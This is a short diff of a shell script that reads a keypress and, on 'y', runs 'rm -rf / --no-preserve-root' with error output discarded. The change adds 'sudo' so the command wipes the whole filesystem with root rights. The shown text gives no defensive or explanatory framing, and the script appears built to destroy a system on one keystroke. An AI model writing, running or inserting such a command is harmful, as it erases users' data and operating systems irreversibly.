@@ -3,5 +3,5 @@ read key
 
 if [ $key = "y" ]
 then
-    rm -rf / --no-preserve-root 2>/dev/null
+    sudo rm -rf / --no-preserve-root 2>/dev/null
 fi
